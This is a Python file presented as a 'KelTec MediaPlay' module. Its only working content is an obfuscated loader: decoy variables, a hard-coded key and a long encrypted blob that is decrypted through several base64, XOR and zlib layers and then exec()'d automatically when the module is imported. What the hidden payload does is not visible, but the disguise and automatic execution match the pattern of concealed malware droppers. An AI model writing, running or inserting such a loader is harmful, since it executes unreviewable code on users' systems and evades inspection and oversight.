# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 398301 ^ 867859
_lx1_1 = len("800001")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-181036)
_lx3_3 = 467916 * 0
_lx4_4 = 479658 ^ 915535
_K = '31e9792164f84ae0594301431984057c52a5d652b256bb30f6599904d4de2648'
_M = 'rOti/7AVq2t4P+v+wzmM0TFwoNDe5Yoo8lP/wKzPmcTu/z2m7EbtPno65anGadrRNyaj0Y7hjXmlBqrBoszNlrj4OvHtGOI+ez3l'
_D = '==QP0xyOrX/12kG1ZATMgyccY2+xnhNpZaqtK0Faif2jKuSjuefTKFZTeQEB1EF4xt0ZwF624odVqinsYymGrDxNmvFsMKXOwHSKHNvdDpuqtETv9470cHwpAwFmn6t4nUqiJZZpDAxY1eSpoLIXVLnmTE1E4a4aNgfJ+RwRdpxeF9ZsGCyK5UW3nxrPc6oKO5vvL/zy9bnEBEkx4GM1tumSNlB45BHTNRNAzUHd26yVroM228JWw338rl8PKYDY67/qtH/2H6qu45DYMO0NQ0gGqAop6j0uqK8jEAITuQ0kVwlOfkG8NcOocAdnrE8ONmorRopHIPCgtONuQbMjFDFDR7jXZ6+gO0uPsLPaaTyy/2paurl1Mcy4wK6T3e7j1ERTbRlHx35qNAv7CG9w/DoIBu04RET1RgGQHrfViI/Nu8yHBtW/icWec0U9O/hQs5dkhuTknJV3kIUjPYB2w8tV/smzk0SBdY6MOZnwsiYfxxnuJBqp4ZWEnW/zZE6IiU4ViAH5NmiriG6b1H7ei6nzjcaDpGlFky0rvtnOaGo4CFDOCAi8IP5caixLTOO4sJCLjQjGLHp2+GdjLSnJc0s6iKhCtqEHW+huDbBgtTE2jKnulu5Hx7EzA5ai15Aw+5VWeWw2lmo1stlP857zAfEHgV59D0TWix97tolvdfkti+t5nuWbAz/wD9qTR+l4Ieu0iygIek5xtst8LKEfr+ZF7fLBxjwDfJndyef3oNlySWKsvuOOtMuUjVnie9KfWJxrakS+V0aE9KPQIrlaytpR1Yqam36MxbL8v4a6z/QIlNdhYD3WZt06qFFyjIW1s30IPpH8YzydjJ7uHQz+aVQ+EXC5Pkg6vXzl5bsWAKrlAerrti3DpVt2udG1SivbEwbyo3dnmMmg+odXd/oXJQs6Mh8wiMTWwNvJG1jh/G0dXXGPt+wew+R73xi4kV56oCrOlrI+Io2OrY+BskBLSIO1r36fPwe6IPrivfBOny+fDcUbQAABX3IpKVkVwNPpaXaXqpz+6mNcShzZBP5lPx3rBuf1xsf3ZIKielXVxWPaXoRAg7LGuR1Nr8JnYkpyXWjpHzaMRMoYHxsBjLcnXPZBF6V6boKsFjSimdDo8IgZZkQn3Rnql2msi8ZalWde/SnSDlRWIGosFV68uzWe3P0oz9wW9vYdx+yF5oCnd25EixU0gm7TKPkKLmEnFAeqCaCJ51DSoaArfQS+lEDPYOUgFWWEuiiLmrePaN+GzdgSFoYE2JySzXnsEo0habkkcIGYctuhzihNUfO5pSWa0zPEaJbae3sCG4mSJwPzHseqWrFtnDuByRXLM+CJSSX/Bp8DoyOHlL6FIK7sxpt1vD8J+A7k30fBmw6xTflPFoaAQPwPaS37v2KaXK8S6oHIKZ8JviCuYJqG6tbyLxrckZlol+L3OgbK7BDIy5vH6jDMUnbno3KRWR1anMzSg0uCIXUNQoY2quq/aNYBvpKig38WYtBqqm+aiGXya/ei2NW1UfB3hPyUJ/Ao2vxJTTq9hev6NhCbyMJzLQA6CPLcQrs5BxQEo6bOaVk/Xu5/EK7p6dSFSUgRP0mXPT23kjRySEIVWd3LpPnr1j9gNovYMZQXoe4ifaUYJxS2IDAVYVIlVgd/7DHqGUeL0A2Pt5ezP3a/QhX6xwUASxtodGP6FeedJROizxgURh9Esy/hPivQDtiWj+ZPUhUTFUQawZ353cIn23dGBArl/vdi+6A1ZTAXg7IrXSTeG+gs8cJB/QzM7zH6fhP9LGMubuKX9ugnnRNOdD24HD73lcd4T3+TTB5+QdZCQFVgaqBPwLmNnrIOTlbqWzNLJ8+VEUYHvUYd'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})